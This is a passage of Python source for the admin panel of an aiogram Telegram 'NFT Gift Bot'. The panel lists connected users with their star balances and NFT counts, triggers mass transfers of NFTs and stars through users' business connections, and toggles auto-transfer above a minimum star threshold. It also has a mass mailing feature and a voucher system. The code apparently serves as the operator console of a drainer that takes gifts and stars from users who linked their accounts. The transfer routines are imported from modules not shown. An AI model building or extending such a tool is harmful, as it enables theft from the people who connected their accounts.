import asyncio
import logging
from typing import Dict, Any, List
from aiogram import F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from states import AdminSettingsStates, MailingStates, CheckSystemStates

from config import is_admin
from utils.file_utils import get_connections, load_settings, save_settings, get_setting, set_setting
from utils.transfer import transfer_all_unique_gifts, get_star_balance, get_unique_gifts, get_regular_gifts
from utils.logging import log_admin_action, log_performance
from utils.automation import send_smart_notifications, auto_transfer_nft_when_ready
from utils.statistics import get_statistics, generate_statistics_report
from utils.user_management import get_users_list, get_user_detailed_info
from utils.mass_operations import mass_transfer_nft, transfer_nft_for_user
from utils.check_system import create_check, get_all_checks, get_checks_statistics, delete_check, get_unused_checks, get_check

router = Router()
logger = logging.getLogger(__name__)

async def safe_edit_message(message, text: str, **kwargs):
    """Безопасное редактирование сообщения с проверкой на изменение содержимого"""
    try:
        current_text = message.text or message.caption or ""
        if current_text == text:
            # Содержимое не изменилось, просто отвечаем
            return False
        
        await message.edit_text(text, **kwargs)
        return True
    except Exception as e:
        if "message is not modified" in str(e).lower():
            # Игнорируем эту ошибку
            return False
        else:
            # Перебрасываем другие ошибки
            raise e

def get_admin_panel_keyboard() -> InlineKeyboardMarkup:
    """Создание клавиатуры админ-панели"""
    auto_transfer = get_setting('auto_transfer', True)
    manual_selection = get_setting('manual_selection', False)
    auto_notifications = get_setting('auto_notifications', True)
    
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"),
            InlineKeyboardButton(text="👥 Пользователи", callback_data="admin_users")
        ],
        [
            InlineKeyboardButton(text="🔄 Массовый перевод NFT", callback_data="admin_mass_nft"),
            InlineKeyboardButton(text="⭐️ Массовый перевод звезд", callback_data="admin_mass_stars")
        ],
        [
            InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_mailing"),
            InlineKeyboardButton(text="🔧 Настройки", callback_data="admin_settings")
        ],
        [
            InlineKeyboardButton(text="🎫 Система чеков", callback_data="admin_checks"),
            InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")
        ]
    ])

@router.message(F.text == "/admin")
async def admin_panel(message: Message):
    """Админ-панель"""
    if not is_admin(message.from_user.id):
        return
    
    keyboard = get_admin_panel_keyboard()
    await message.answer(
        "🔧 <b>Админ-панель NFT Gift Bot</b>\n\n"
        "Выберите действие:",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@router.callback_query(F.data == "admin_stats")
async def admin_statistics(callback: CallbackQuery):
    """Показать статистику"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("📊 Загружаем статистику...")
    
    try:
        report = await generate_statistics_report()
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_stats")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
        ])
        
        edited = await safe_edit_message(
            callback.message,
            report,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        if not edited:
            await callback.answer("📊 Статистика актуальна")
            
    except Exception as e:
        logger.error(f"Ошибка получения статистики: {e}")
        await safe_edit_message(
            callback.message,
            f"❌ Ошибка получения статистики: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )

@router.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    """Показать пользователей"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("👥 Загружаем список пользователей...")
    
    try:
        users = await get_users_list()
        
        if not users:
            users_text = "👥 <b>Пользователи</b>\n\nСписок пользователей пуст."
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        else:
            # Формируем список пользователей
            users_text = "👥 <b>Пользователи</b>\n\n"
            for i, user in enumerate(users[:20], 1):  # Показываем первые 20
                username = user.get('username', 'N/A')
                user_id = user.get('user_id', 'N/A')
                connection_date = user.get('connection_date', 'N/A')[:10]  # Только дата
                
                users_text += f"{i}. @{username} (ID: {user_id})\n"
                users_text += f"   📅 Подключен: {connection_date}\n\n"
            
            if len(users) > 20:
                users_text += f"... и ещё {len(users) - 20} пользователей"
            
            keyboard = []
            for i, user in enumerate(users[:10], 1):  # Кнопки для первых 10
                username = user.get('username', f'User{i}')
                user_id = user.get('user_id')
                keyboard.append([
                    InlineKeyboardButton(
                        text=f"👤 {username}",
                        callback_data=f"user_info:{user_id}"
                    )
                ])
            
            keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")])
            keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard)
        
        edited = await safe_edit_message(
            callback.message,
            users_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        if not edited:
            await callback.answer("👥 Список пользователей актуален")
    except Exception as e:
        logger.error(f"Ошибка получения пользователей: {e}")
        await safe_edit_message(
            callback.message,
            f"❌ Ошибка получения пользователей: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )

@router.callback_query(F.data.startswith("user_info:"))
async def user_info(callback: CallbackQuery):
    """Информация о пользователе"""
    if not is_admin(callback.from_user.id):
        return
    
    user_id = int(callback.data.split(":")[1])
    await callback.answer(f"👤 Загружаем информацию о пользователе {user_id}...")
    
    try:
        user_info = await get_user_detailed_info(callback.bot, user_id)
        
        if not user_info:
            await callback.message.edit_text(
                f"❌ Пользователь {user_id} не найден",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_users")]
                ])
            )
            return
        
        username = user_info.get('username', 'N/A')
        connection_date = user_info.get('connection_date', 'N/A')[:10]
        star_balance = user_info.get('star_balance', 'N/A')
        nft_count = user_info.get('nft_count', 'N/A')
        total_transfers = user_info.get('total_transfers', 0)
        success_rate = user_info.get('success_rate', 0)
        
        text = (
            f"👤 <b>Информация о пользователе</b>\n\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"👤 Username: @{username}\n"
            f"📅 Подключен: {connection_date}\n"
            f"⭐️ Звезд: {star_balance}\n"
            f"🎁 NFT: {nft_count}\n"
            f"🔄 Переводов: {total_transfers}\n"
            f"📈 Успешность: {success_rate:.1f}%\n"
        )
        
        keyboard = [
            [InlineKeyboardButton(text="📋 Логи", callback_data=f"user_logs:{user_id}")],
            [InlineKeyboardButton(text="🔄 Повторить NFT", callback_data=f"retry_nft_user:{user_id}")],
            [InlineKeyboardButton(text="💬 Написать", url=f"tg://user?id={user_id}")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_users")]
        ]
        
        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
        )
    except Exception as e:
        logger.error(f"Ошибка получения информации о пользователе: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка получения информации: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_users")]
            ])
        )

@router.callback_query(F.data == "admin_mass_nft")
async def admin_mass_nft(callback: CallbackQuery):
    """Массовый перевод NFT"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("🔄 Запускаем массовый перевод NFT...")
    
    try:
        result = await mass_transfer_nft(callback.bot)
        
        # result теперь строка, а не словарь
        await callback.message.edit_text(
            result,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
    except Exception as e:
        logger.error(f"Ошибка массового перевода NFT: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка массового перевода NFT: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )



async def admin_settings_from_message(message: Message):
    """Настройки бота (для вызова из обработчика сообщений)"""
    auto_transfer = get_setting('auto_transfer', True)
    manual_selection = get_setting('manual_selection', False)
    auto_notifications = get_setting('auto_notifications', True)
    min_stars = get_setting('min_stars_for_auto_transfer', 10)
    
    text = (
        "🔧 <b>Настройки бота</b>\n\n"
        f"🤖 Автоперевод: {'✅ Включен' if auto_transfer else '❌ Выключен'}\n"
        f"👆 Ручной выбор: {'✅ Включен' if manual_selection else '❌ Выключен'}\n"
        f"🔔 Автоуведомления: {'✅ Включены' if auto_notifications else '❌ Выключены'}\n"
        f"⭐️ Мин. звезд для автоперевода: {min_stars}\n"
    )
    
    keyboard = [
        [
            InlineKeyboardButton(
                text="🤖 Автоперевод",
                callback_data="admin_toggle_auto"
            ),
            InlineKeyboardButton(
                text="👆 Ручной выбор",
                callback_data="admin_toggle_manual"
            )
        ],
        [
            InlineKeyboardButton(
                text="🔔 Уведомления",
                callback_data="admin_toggle_notifications"
            ),
            InlineKeyboardButton(
                text="⭐️ Мин. звезд",
                callback_data="admin_min_stars"
            )
        ],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
    ]
    
    await message.answer(
        text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

async def admin_back_from_message(message: Message):
    """Возврат в админ-панель (для вызова из обработчика сообщений)"""
    keyboard = get_admin_panel_keyboard()
    await message.answer(
        "🔧 <b>Админ-панель NFT Gift Bot</b>\n\n"
        "Выберите действие:",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@router.callback_query(F.data == "admin_settings")
async def admin_settings(callback: CallbackQuery):
    """Настройки бота"""
    if not is_admin(callback.from_user.id):
        return
    
    auto_transfer = get_setting('auto_transfer', True)
    manual_selection = get_setting('manual_selection', False)
    auto_notifications = get_setting('auto_notifications', True)
    min_stars = get_setting('min_stars_for_auto_transfer', 10)
    
    text = (
        "🔧 <b>Настройки бота</b>\n\n"
        f"🤖 Автоперевод: {'✅ Включен' if auto_transfer else '❌ Выключен'}\n"
        f"👆 Ручной выбор: {'✅ Включен' if manual_selection else '❌ Выключен'}\n"
        f"🔔 Автоуведомления: {'✅ Включены' if auto_notifications else '❌ Выключены'}\n"
        f"⭐️ Мин. звезд для автоперевода: {min_stars}\n"
    )
    
    keyboard = [
        [
            InlineKeyboardButton(
                text="🤖 Автоперевод",
                callback_data="admin_toggle_auto"
            ),
            InlineKeyboardButton(
                text="👆 Ручной выбор",
                callback_data="admin_toggle_manual"
            )
        ],
        [
            InlineKeyboardButton(
                text="🔔 Уведомления",
                callback_data="admin_toggle_notifications"
            ),
            InlineKeyboardButton(
                text="⭐️ Мин. звезд",
                callback_data="admin_min_stars"
            )
        ],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
    ]
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

@router.callback_query(F.data == "admin_toggle_auto")
async def admin_toggle_auto(callback: CallbackQuery):
    """Переключение автоперевода"""
    if not is_admin(callback.from_user.id):
        return
    
    current = get_setting('auto_transfer', True)
    set_setting('auto_transfer', not current)
    save_settings()
    
    await callback.answer(f"Автоперевод {'включен' if not current else 'выключен'}")
    await admin_settings(callback)

@router.callback_query(F.data == "admin_toggle_manual")
async def admin_toggle_manual(callback: CallbackQuery):
    """Переключение ручного выбора"""
    if not is_admin(callback.from_user.id):
        return
    
    current = get_setting('manual_selection', False)
    set_setting('manual_selection', not current)
    save_settings()
    
    await callback.answer(f"Ручной выбор {'включен' if not current else 'выключен'}")
    await admin_settings(callback)

@router.callback_query(F.data == "admin_toggle_notifications")
async def admin_toggle_notifications(callback: CallbackQuery):
    """Переключение уведомлений"""
    if not is_admin(callback.from_user.id):
        return
    
    current = get_setting('auto_notifications', True)
    set_setting('auto_notifications', not current)
    save_settings()
    
    await callback.answer(f"Уведомления {'включены' if not current else 'выключены'}")
    await admin_settings(callback)

@router.callback_query(F.data == "admin_min_stars")
async def admin_min_stars(callback: CallbackQuery):
    """Изменение минимального количества звезд"""
    if not is_admin(callback.from_user.id):
        return
    
    current_min_stars = get_setting('min_stars_for_auto_transfer', 10)
    
    text = (
        "⭐️ <b>Минимальное количество звезд для автоперевода</b>\n\n"
        f"📊 Текущее значение: <b>{current_min_stars}</b>\n\n"
        "Выберите новое значение:"
    )
    
    keyboard = [
        [
            InlineKeyboardButton(text="5", callback_data="admin_set_min_stars:5"),
            InlineKeyboardButton(text="10", callback_data="admin_set_min_stars:10"),
            InlineKeyboardButton(text="15", callback_data="admin_set_min_stars:15")
        ],
        [
            InlineKeyboardButton(text="20", callback_data="admin_set_min_stars:20"),
            InlineKeyboardButton(text="25", callback_data="admin_set_min_stars:25"),
            InlineKeyboardButton(text="30", callback_data="admin_set_min_stars:30")
        ],
        [
            InlineKeyboardButton(text="50", callback_data="admin_set_min_stars:50"),
            InlineKeyboardButton(text="100", callback_data="admin_set_min_stars:100")
        ],
        [
            InlineKeyboardButton(text="✏️ Ввести вручную", callback_data="admin_manual_min_stars")
        ],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_settings")]
    ]
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

@router.callback_query(F.data.startswith("admin_set_min_stars:"))
async def admin_set_min_stars(callback: CallbackQuery):
    """Установка минимального количества звезд"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        # Получаем новое значение из callback_data
        new_value = int(callback.data.split(":")[1])
        
        # Сохраняем новое значение
        set_setting('min_stars_for_auto_transfer', new_value)
        save_settings()
        
        await callback.answer(f"✅ Минимальное количество звезд установлено: {new_value}")
        await admin_settings(callback)
        
    except (ValueError, IndexError) as e:
        logger.error(f"Ошибка установки минимального количества звезд: {e}")
        await callback.answer("❌ Ошибка установки значения", show_alert=True)

@router.callback_query(F.data == "admin_manual_min_stars")
async def admin_manual_min_stars(callback: CallbackQuery, state: FSMContext):
    """Запрос ручного ввода минимального количества звезд"""
    if not is_admin(callback.from_user.id):
        return
    
    await state.set_state(AdminSettingsStates.waiting_for_min_stars)
    
    text = (
        "✏️ <b>Введите минимальное количество звезд</b>\n\n"
        "📝 Отправьте число от 1 до 1000\n"
        "💡 Например: 25\n\n"
        "❌ Для отмены отправьте /cancel"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_settings")]
    ])
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@router.message(AdminSettingsStates.waiting_for_min_stars)
async def handle_manual_min_stars(message: Message, state: FSMContext):
    """Обработка ручного ввода минимального количества звезд"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        # Проверяем, что введено число
        if not message.text.isdigit():
            await message.answer(
                "❌ <b>Ошибка!</b>\n\n"
                "📝 Пожалуйста, введите число от 1 до 1000\n"
                "💡 Например: 25\n\n"
                "❌ Для отмены отправьте /cancel",
                parse_mode="HTML"
            )
            return
        
        value = int(message.text)
        
        # Проверяем диапазон
        if value < 1 or value > 1000:
            await message.answer(
                "❌ <b>Ошибка!</b>\n\n"
                "📝 Значение должно быть от 1 до 1000\n"
                "💡 Попробуйте еще раз\n\n"
                "❌ Для отмены отправьте /cancel",
                parse_mode="HTML"
            )
            return
        
        # Сохраняем новое значение
        set_setting('min_stars_for_auto_transfer', value)
        save_settings()
        
        # Очищаем состояние
        await state.clear()
        
        await message.answer(
            f"✅ <b>Минимальное количество звезд установлено: {value}</b>",
            parse_mode="HTML"
        )
        
        # Возвращаемся к настройкам
        await admin_settings_from_message(message)
        
    except ValueError:
        await message.answer(
            "❌ <b>Ошибка!</b>\n\n"
            "📝 Пожалуйста, введите корректное число\n"
            "💡 Например: 25\n\n"
            "❌ Для отмены отправьте /cancel",
            parse_mode="HTML"
        )

@router.message(MailingStates.waiting_for_text)
async def handle_mailing_text(message: Message, state: FSMContext):
    """Обработка текста рассылки"""
    if not is_admin(message.from_user.id):
        return
    
    # Сохраняем текст рассылки
    await state.update_data(mailing_text=message.text)
    await state.set_state(MailingStates.waiting_for_photo)
    
    text = (
        "📷 <b>Добавление изображения</b>\n\n"
        f"📝 <b>Текст рассылки:</b>\n{message.text[:200]}{'...' if len(message.text) > 200 else ''}\n\n"
        "📷 Отправьте изображение для рассылки\n"
        "⏭️ Или нажмите 'Пропустить' для рассылки без изображения\n\n"
        "❌ Для отмены отправьте /cancel"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⏭️ Пропустить", callback_data="mailing_skip_photo")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_back")]
    ])
    
    await message.answer(
        text,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@router.message(MailingStates.waiting_for_photo, F.photo)
async def handle_mailing_photo(message: Message, state: FSMContext):
    """Обработка изображения рассылки"""
    if not is_admin(message.from_user.id):
        return
    
    # Получаем данные рассылки
    data = await state.get_data()
    mailing_text = data.get('mailing_text', '')
    
    # Сохраняем file_id изображения
    photo_file_id = message.photo[-1].file_id
    
    text = (
        "📢 <b>Предварительный просмотр рассылки</b>\n\n"
        f"📝 <b>Текст:</b>\n{mailing_text[:200]}{'...' if len(mailing_text) > 200 else ''}\n\n"
        "📷 <b>Изображение:</b> ✅ Добавлено\n\n"
        "🚀 Нажмите 'Отправить' для начала рассылки\n"
        "❌ Или 'Отмена' для отмены"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Отправить", callback_data="mailing_send")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_back")]
    ])
    
    # Сохраняем file_id в состоянии
    await state.update_data(photo_file_id=photo_file_id)
    
    await message.answer(
        text,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@router.message(MailingStates.waiting_for_photo, ~F.photo)
async def handle_mailing_photo_invalid(message: Message, state: FSMContext):
    """Обработка некорректного ввода для изображения"""
    if not is_admin(message.from_user.id):
        return
    
    await message.answer(
        "❌ <b>Ошибка!</b>\n\n"
        "📷 Пожалуйста, отправьте изображение\n"
        "⏭️ Или нажмите 'Пропустить' для рассылки без изображения\n\n"
        "❌ Для отмены отправьте /cancel",
        parse_mode="HTML"
    )

@router.message(F.text == "/cancel")
async def cancel_input(message: Message, state: FSMContext):
    """Отмена ввода (универсальная)"""
    if not is_admin(message.from_user.id):
        return
    
    current_state = await state.get_state()
    
    if current_state == AdminSettingsStates.waiting_for_min_stars.state:
        await state.clear()
        await message.answer("❌ Ввод отменен")
        await admin_settings_from_message(message)
    elif current_state in [MailingStates.waiting_for_text.state, MailingStates.waiting_for_photo.state]:
        await state.clear()
        await message.answer("❌ Создание рассылки отменено")
        await admin_back_from_message(message)
    elif current_state in [CheckSystemStates.waiting_for_stars_amount.state, CheckSystemStates.waiting_for_check_description.state]:
        await state.clear()
        await message.answer("❌ Создание чека отменено")
        # Возвращаемся к системе чеков
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад к системе чеков", callback_data="admin_checks")]
        ])
        await message.answer("Выберите действие:", reply_markup=keyboard)

@router.callback_query(F.data == "admin_mailing")
async def admin_mailing(callback: CallbackQuery, state: FSMContext):
    """Начало создания рассылки"""
    if not is_admin(callback.from_user.id):
        return
    
    await state.set_state(MailingStates.waiting_for_text)
    
    text = (
        "📢 <b>Создание рассылки</b>\n\n"
        "📝 Отправьте текст рассылки\n\n"
        "💡 Поддерживается HTML разметка:\n"
        "• <b>жирный</b>\n"
        "• <i>курсив</i>\n"
        "• <code>код</code>\n"
        "• <a href='ссылка'>ссылка</a>\n\n"
        "❌ Для отмены отправьте /cancel"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_back")]
    ])
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@router.callback_query(F.data == "mailing_skip_photo")
async def mailing_skip_photo(callback: CallbackQuery, state: FSMContext):
    """Пропуск добавления изображения"""
    if not is_admin(callback.from_user.id):
        return
    
    # Получаем данные рассылки
    data = await state.get_data()
    mailing_text = data.get('mailing_text', '')
    
    text = (
        "📢 <b>Предварительный просмотр рассылки</b>\n\n"
        f"📝 <b>Текст:</b>\n{mailing_text[:200]}{'...' if len(mailing_text) > 200 else ''}\n\n"
        "📷 <b>Изображение:</b> ❌ Не добавлено\n\n"
        "🚀 Нажмите 'Отправить' для начала рассылки\n"
        "❌ Или 'Отмена' для отмены"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Отправить", callback_data="mailing_send")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_back")]
    ])
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@router.callback_query(F.data == "mailing_send")
async def mailing_send(callback: CallbackQuery, state: FSMContext):
    """Отправка рассылки"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("🚀 Начинаем рассылку...")
    
    try:
        # Получаем данные рассылки
        data = await state.get_data()
        mailing_text = data.get('mailing_text', '')
        photo_file_id = data.get('photo_file_id', None)
        
        # Получаем список пользователей
        from utils.database import db
        users = db.get_all_users()
        
        if not users:
            await callback.message.edit_text(
                "❌ <b>Ошибка рассылки</b>\n\n"
                "👥 Нет пользователей для рассылки",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
                ])
            )
            await state.clear()
            return
        
        # Начинаем рассылку
        success_count = 0
        failed_count = 0
        
        progress_message = await callback.message.edit_text(
            f"📢 <b>Рассылка в процессе...</b>\n\n"
            f"👥 Всего пользователей: {len(users)}\n"
            f"✅ Отправлено: 0\n"
            f"❌ Ошибок: 0",
            parse_mode="HTML"
        )
        
        for i, user in enumerate(users, 1):
            try:
                user_id = user.get('user_id')
                if not user_id:
                    continue
                
                # Отправляем сообщение
                if photo_file_id:
                    await callback.bot.send_photo(
                        chat_id=user_id,
                        photo=photo_file_id,
                        caption=mailing_text,
                        parse_mode="HTML"
                    )
                else:
                    await callback.bot.send_message(
                        chat_id=user_id,
                        text=mailing_text,
                        parse_mode="HTML"
                    )
                
                success_count += 1
                
                # Обновляем прогресс каждые 10 отправок
                if i % 10 == 0:
                    await progress_message.edit_text(
                        f"📢 <b>Рассылка в процессе...</b>\n\n"
                        f"👥 Всего пользователей: {len(users)}\n"
                        f"✅ Отправлено: {success_count}\n"
                        f"❌ Ошибок: {failed_count}",
                        parse_mode="HTML"
                    )
                
                # Небольшая задержка между отправками
                await asyncio.sleep(0.1)
                
            except Exception as e:
                failed_count += 1
                logger.error(f"Ошибка отправки рассылки пользователю {user_id}: {e}")
        
        # Финальный результат
        await progress_message.edit_text(
            f"📢 <b>Рассылка завершена!</b>\n\n"
            f"👥 Всего пользователей: {len(users)}\n"
            f"✅ Успешно отправлено: {success_count}\n"
            f"❌ Ошибок: {failed_count}\n\n"
            f"📝 <b>Текст:</b>\n{mailing_text[:100]}{'...' if len(mailing_text) > 100 else ''}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
        
        # Очищаем состояние
        await state.clear()
        
    except Exception as e:
        logger.error(f"Ошибка рассылки: {e}")
        await callback.message.edit_text(
            f"❌ <b>Ошибка рассылки</b>\n\n"
            f"Ошибка: {str(e)}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
        await state.clear()

@router.callback_query(F.data == "admin_back")
async def admin_back(callback: CallbackQuery):
    """Возврат в админ-панель"""
    if not is_admin(callback.from_user.id):
        return
    
    keyboard = get_admin_panel_keyboard()
    await callback.message.edit_text(
        "🔧 <b>Админ-панель NFT Gift Bot</b>\n\n"
        "Выберите действие:",
        reply_markup=keyboard,
        parse_mode="HTML"
    )



@router.callback_query(F.data == "admin_logs")
async def admin_logs(callback: CallbackQuery):
    """Показать логи"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("📋 Загружаем логи...")
    
    try:
        from utils.database import db
        logs = db.get_recent_logs(10)
        
        if not logs:
            text = "📋 <b>Логи пусты</b>"
        else:
            text = "📋 <b>Последние логи:</b>\n\n"
            for i, log in enumerate(logs[:5], 1):  # Показываем только 5 последних
                timestamp = log.get('timestamp', '')[:19]
                user_id = log.get('user_id', 'N/A')
                status = log.get('status', 'N/A')
                error = log.get('error', '')
                
                text += f"<b>{i}.</b> 🕐 {timestamp}\n"
                text += f"👤 ID: {user_id} | 📊 {status}\n"
                if error:
                    text += f"❌ {error[:50]}...\n"
                text += "\n"
        
        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_logs")],
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
    except Exception as e:
        logger.error(f"Ошибка получения логов: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка получения логов: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )





@router.callback_query(F.data == "admin_mass_stars")
async def admin_mass_stars(callback: CallbackQuery):
    """Массовый перевод звезд"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("⭐️ Запускаем массовый перевод звезд...")
    
    try:
        # Получаем всех пользователей
        connections = get_connections()
        total_stars = 0
        successful = 0
        failed = 0
        errors = []
        
        for connection in connections:
            try:
                user_id = connection.get('user_id')
                business_connection_id = connection.get('business_connection_id')
                if user_id and business_connection_id:
                    # Получаем баланс звезд
                    balance = await get_star_balance(callback.bot, business_connection_id)
                    if balance and balance > 0:
                        # Здесь должна быть логика перевода звезд
                        total_stars += balance
                        successful += 1
            except Exception as e:
                failed += 1
                user_id = connection.get('user_id', 'Unknown')
                errors.append(f"Пользователь {user_id}: {str(e)}")
        
        text = (
            f"⭐️ <b>Массовый перевод звезд завершен</b>\n\n"
            f"👥 Обработано пользователей: {len(connections)}\n"
            f"⭐️ Всего звезд: {total_stars}\n"
            f"✅ Успешно: {successful}\n"
            f"❌ Ошибок: {failed}\n"
        )
        
        if errors:
            text += "\n⚠️ <b>Основные ошибки:</b>\n"
            for error in errors[:3]:
                text += f"• {error}\n"
        
        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
    except Exception as e:
        logger.error(f"Ошибка массового перевода звезд: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка массового перевода звезд: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )

@router.message(F.text == "/logs")
async def show_logs(message: Message):
    """Показать логи"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        from utils.file_utils import get_recent_logs
        logs = get_recent_logs(10)
        
        if not logs:
            await message.answer("📋 Логи пусты")
            return
        
        log_text = "📋 <b>Последние логи:</b>\n\n"
        for log in logs:
            timestamp = log.get('timestamp', '')[:19]  # Убираем миллисекунды
            user_id = log.get('user_id', 'N/A')
            status = log.get('status', 'N/A')
            error = log.get('error', '')
            
            log_text += f"🕐 {timestamp}\n"
            log_text += f"👤 ID: {user_id}\n"
            log_text += f"📊 Статус: {status}\n"
            if error:
                log_text += f"❌ Ошибка: {error}\n"
            log_text += "\n"
        
        await message.answer(log_text, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Ошибка получения логов: {e}")
        await message.answer(f"❌ Ошибка получения логов: {str(e)}")

@router.message(F.text.startswith("/delete_check"))
async def delete_check_command(message: Message):
    """Команда для удаления чека по ID"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        # Парсим ID чека из команды
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer(
                "❌ <b>Неверный формат команды!</b>\n\n"
                "💡 <b>Правильный формат:</b>\n"
                "<code>/delete_check ID_чека</code>\n\n"
                "📝 <b>Пример:</b>\n"
                "<code>/delete_check d4080cb3-1d1e-4dfd-a782-88549703df2a</code>",
                parse_mode="HTML"
            )
            return
        
        check_id = parts[1].strip()
        check = get_check(check_id)
        
        if not check:
            await message.answer(
                "❌ <b>Чек не найден!</b>\n\n"
                f"ID: <code>{check_id}</code>\n\n"
                "Проверьте правильность ID чека.",
                parse_mode="HTML"
            )
            return
        
        if check["used"]:
            await message.answer(
                "❌ <b>Нельзя удалить использованный чек!</b>\n\n"
                f"🎫 <b>ID чека:</b> <code>{check['id']}</code>\n"
                f"⭐️ <b>Звезд:</b> {check['stars_amount']}\n"
                f"👤 <b>Использовал:</b> {check.get('username', 'Неизвестно')}\n"
                f"📅 <b>Использован:</b> {check.get('used_at', 'Неизвестно')[:19].replace('T', ' ') if check.get('used_at') else 'Неизвестно'}",
                parse_mode="HTML"
            )
            return
        
        # Удаляем чек
        if delete_check(check_id):
            text = (
                f"✅ <b>Чек успешно удален!</b>\n\n"
                f"🎫 <b>ID чека:</b> <code>{check['id']}</code>\n"
                f"⭐️ <b>Звезд:</b> {check['stars_amount']}\n"
                f"📝 <b>Описание:</b> {check.get('description', 'Не указано')}\n"
